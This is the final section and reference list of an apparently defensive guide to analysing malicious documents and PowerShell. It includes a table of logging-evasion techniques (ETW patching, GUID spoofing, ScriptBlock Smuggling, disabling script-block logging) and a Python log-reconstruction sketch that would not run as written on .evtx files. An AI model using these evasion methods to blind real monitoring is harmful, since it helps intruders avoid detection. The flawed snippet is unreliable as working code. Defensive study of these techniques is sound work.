| ETW patching | Patch `EtwEventWrite` to suppress events | Detected by ETW monitoring |
| GUID spoofing | Write events with non-standard provider GUID | Evades event filtering |
| ScriptBlock Smuggling | Dual AST causes log/execute divergence | Hardest to detect |
| Registry disable | Disable `EnableScriptBlockLogging` | Requires elevated privileges |
| EncodedCommand | `-EncodedCommand` base64 launches child process | Avoids parent logging |

### 11.3 Reconstruction from Logs

When ScriptBlock logging captures payloads in multiple Event ID 4104 records, reconstruction is needed:

```python
# Reconstruct split scripts from event logs
import xml.etree.ElementTree as ET

# Parse Windows Event Log 4104 entries
script_blocks = []
tree = ET.parse('powershell_events.evtx')
for entry in tree.findall('.//Event[System/EventID=4104]'):
    text = entry.find('.//Data[@Name="ScriptBlockText"]').text
    script_blocks.append({
        'id': entry.find('.//Data[@Name="ScriptBlockId"]').text,
        'text': text,
        'size': int(entry.find('.//Data[@Name="ScriptBlockSize"]').text),
    })

# Reconstruct by script block ID
reconstructed = {}
for sb in script_blocks:
    reconstructed[sb['id']] = reconstructed.get(sb['id'], '') + sb['text']
```

---

## 12. References

| # | Source |
|---|--------|
| [1] | oletools documentation — OLE2 structure and macro extraction. [GitHub](https://github.com/decalage2/oletools/wiki) |
| [2] | decalage2/oletools — Python toolkit for OLE2 analysis. [GitHub](https://github.com/decalage2/oletools) |
| [3] | pcodedmp — VBA p-code disassembler by Dr. Vesselin Bontchev. [GitHub](https://github.com/bontchev/pcodedmp) |
| [4] | ViperMonkey — VBA parser and emulation engine. [GitHub](https://github.com/decalage2/ViperMonkey) |
| [5] | VBA Stomping — Advanced maldoc techniques. [Walmart Global Tech](https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278) |
| [6] | Reverse Engineering an Obfuscated Malicious Macro. [Walmart Global Tech](https://medium.com/walmartglobaltech/reverse-engineering-an-obfuscated-malicious-macro-3fd4d4f9c439) |
| [7] | olevba usage and reference. [aldeid](https://www.aldeid.com/wiki/Python-oletools/olevba) |
| [8] | oletools cheat sheet. [1337skills](https://1337skills.com/cheatsheets/oletools/) |
| [9] | Deobfuscating a Malicious Word Document. [ThreatSpike](https://www.threatspike.com/blog/deobfuscating-a-malicious-word-document/) |
| [10] | Purgalicious VBA — Macro obfuscation with VBA purging. [Google Cloud](https://cloud.google.com/blog/topics/threat-intelligence/purgalicious-vba-macro-obfuscation-with-vba-purging/) |
| [11] | Symbexcel — Symbolic execution for XLM macros. [VMware](https://blogs.vmware.com/networkvirtualization/2021/09/symbexcel-bringing-the-power-of-symbolic-execution-to-the-fight-against-malicious-excel-4-macros.html/) |
| [12] | Excel 4.0 Macros — Initial Access. [F-Secure](https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-4) |
| [13] | Spotting Malicious Excel4 Macros. [ReversingLabs](https://www.reversinglabs.com/blog/spotting-malicious-excel4-macros) |
| [14] | XLM + AMSI runtime defense. [Microsoft Security](https://www.microsoft.com/en-us/security/blog/2021/03/03/xlm-amsi-new-runtime-defense-against-excel-4-0-macro-malware/) |
| [15] | PowerPeeler — Dynamic PowerShell deobfuscation. [arXiv](https://arxiv.org/abs/2406.04027) |
| [16] | PowerShell Obfuscation techniques. [OffSec](https://www.offsec.com/offsec/powershell-obfuscation/) |
| [17] | Invoke-Obfuscation by Daniel Bohannon. [GitHub](https://github.com/danielbohannon/Invoke-obfuscation) |
| [18] | Invoke-PSObfuscation — Component-level obfuscation. [GitHub](https://github.com/gh0x0st/invoke-psobfuscation) |
| [19] | CnC detection — Empire, Meterpreter, Cobalt Strike. [GitHub](https://github.com/DfirJos/CnC-detection) |
| [20] | Inspecting a PowerShell Cobalt Strike Beacon. [ForensicITGuy](https://forensicitguy.github.io/inspecting-powershell-cobalt-strike-beacon/) |
| [21] | Deobfuscating a PowerShell Cobalt Strike beacon stager. [Medium](https://medium.com/@polygonben/deobfuscating-a-powershell-cobalt-strike-beacon-loader-c650df862c34) |
| [22] | Reconstructing PowerShell scripts from multiple Windows event logs. [Sophos](https://www.sophos.com/en-gb/blog/reconstructing-powershell-scripts-from-multiple-windows-event-logs) |
| [23] | Breaking AMSI — How malware avoids Windows script scanning. [Medium](https://medium.com/@andrew.petrus/breaking-amsi-how-malware-avoids-windows-script-scanning-92e5588cd355) |
| [24] | AMSI bypass using Python. [Fluid Attacks](https://fluidattacks.com/es/blog/amsi-bypass-python) |
| [25] | ScriptBlock Smuggling — Dual AST evasion technique. [ResearchGate](https://www.researchgate.net/publication/379275980_ScriptBlock_Smuggling_Uncovering_Stealthy_Evasion_Techniques_in_PowerShell_and_NET_Environments) |
| [26] | PowerShell and .NET AMSI interface. [S3cur3Th1sSh1t](https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/) |
| [27] | Suspicious Portable Executable Encoded in PowerShell Script. [Elastic](https://www.elastic.co/guide/en/security/current/suspicious-portable-executable-encoded-in-powershell-script.html) |
| [28] | PowerShell Base64 Encoded Reflective Assembly Load. [ManageEngine](https://www.manageengine.com/uk/log-management/detection-rules/powershell-base64-encoded-reflective-assembly-load.html) |
| [29] | PowerShell Logging Obfuscation Bypasses. [RedPacket Security](https://www.redpacketsecurity.com/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/) |
| [30] | ScriptBlock Smuggling technical writeup. [DFIR.CH](https://www.dfir.ch/posts/scriptblock_smuggling/) |
| [31] | PowerShell enhanced logging capabilities bypass. [AvantGuard](https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass) |
| [32] | Todyl detection engineering — PowerShell script reversing. [Todyl](https://www.todyl.com/blog/a-stroll-through-powershell-script-reversing) |
| [33] | Decoding Cobalt Strike — Understanding payloads. [Gen Digital](https://www.gendigital.com/blog/insights/research/decoding-cobalt-strike-understanding-payloads) |
| [34] | CobaltStrike Beacon Reversing. [Netscylla](https://www.netscylla.com/blog/2021/08/25/CobaltStrike-Beacon-Reversing.html) |
| [35] | KimJongRAT — PowerShell implementation analysis. [Unit 42](https://unit42.paloaltonetworks.com/kimjongrat-stealer-variant-powershell/) |
| [36] | Deconstructing PowerShell Obfuscation in Malspam Campaigns. [SentinelOne](https://www.sentinelone.com/blog/deconstructing-powershell-obfuscation-in-malspam-campaigns/) |
